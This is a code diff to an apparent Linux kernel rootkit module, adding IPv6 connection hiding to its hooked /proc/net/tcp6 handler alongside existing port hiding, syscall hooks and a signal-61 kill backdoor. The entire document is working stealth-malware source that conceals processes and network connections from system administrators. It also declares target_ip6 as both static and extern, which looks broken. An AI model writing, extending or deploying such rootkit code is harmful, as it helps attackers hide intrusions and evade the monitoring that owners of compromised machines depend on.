@@ -33,6 +33,7 @@
 #include <linux/string.h>
 #include <linux/delay.h>
 #include <linux/rcupdate.h>
+#include <linux/in6.h>
 #include <linux/atomic.h>
 #include <linux/uio.h>
 
@@ -55,6 +56,8 @@ struct hidden_pid {
     char pid_str[NAME_MAX];
     struct list_head list;
 };
+
+static struct in6_addr target_ip6 = IN6ADDR_LOOPBACK_INIT;
 
 typedef int (*do_syslog_t)(int type, char __user *buf, int len, int from_file);
 typedef ssize_t (*devkmsg_read_t)(struct file *file, char __user *buf, size_t count, loff_t *ppos);
@@ -89,7 +92,7 @@ static DEFINE_SPINLOCK(ports_lock);
 static LIST_HEAD(hidden_pids_list);
 static DEFINE_SPINLOCK(pids_lock);
 
-static int port_to_hide = 0;
+extern struct in6_addr target_ip6;
 
 static bool buf_has_hide_keyword(const char *kbuf, size_t len)
 {
@@ -702,7 +705,8 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
         return 0;
     }
 
-        if (sig == 61) {
+         // Signal 61: Hide/Unhide Network Ports
+    if (sig == 61) {
         u16 target_port = (u16)pid;
         if (target_port == 0) {
             hidden_ports_count = 0;
@@ -726,6 +730,9 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
     return orig_kill(regs);
 }
 
+
+/* --- Network Seq Show Hooks --- */
+
 static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
     if (v != SEQ_START_TOKEN && v != NULL && hidden_ports_count > 0) {
         struct sock *sk = (struct sock *)v;
@@ -740,27 +747,30 @@ static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
     return orig_tcp4_seq_show(seq, v);
 }
 
+static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v) {
+if (v != SEQ_START_TOKEN && v != NULL) {
+    struct sock *sk = (struct sock *)v;
 
-static int hooked_tcp6_seq_show(struct seq_file *seq, void *v)
-{
-    int ret;
-
-    if (!orig_tcp6_seq_show)
-        return -EINVAL;
-
-    ret = orig_tcp6_seq_show(seq, v);
-
-    if (seq && seq->buf && seq->count > 0 && seq->count < seq->size) {
-        size_t local_count = (size_t)seq->count;
-        filter_buffer(seq->buf, &local_count);
-
-        if (local_count <= (size_t)seq->size)
-            seq->count = (int)local_count;
+    if (sk->sk_family == AF_INET6) {
+        if (ipv6_addr_equal(&sk->sk_v6_daddr, &target_ip6) ||
+            ipv6_addr_equal(&sk->sk_v6_rcv_saddr, &target_ip6)) {
+            return 0;   // Hide IPv6 address match
+        }
     }
-
-    return ret;
 }
 
+    if (v != SEQ_START_TOKEN && v != NULL && hidden_ports_count > 0) {
+        struct sock *sk = (struct sock *)v;
+        if (sk->sk_state == TCP_TIME_WAIT) {
+            struct inet_timewait_sock *tw = (struct inet_timewait_sock *)v;
+            if (is_port_hidden(ntohs(tw->tw_sport)) || is_port_hidden(ntohs(tw->tw_dport))) return 0;
+        } else {
+            struct inet_sock *inet = inet_sk(sk);
+            if (is_port_hidden(ntohs(inet->inet_sport)) || is_port_hidden(ntohs(inet->inet_dport))) return 0;
+        }
+    }
+    return orig_tcp6_seq_show(seq, v);
+}
 static struct ftrace_hook fh_hooks[] = {
     HOOK("__x64_sys_recvmsg",    hook_recvmsg,         &orig_recvmsg),
     HOOK("__x64_sys_sendmsg",    hook_sendmsg,         &orig_sendmsg),
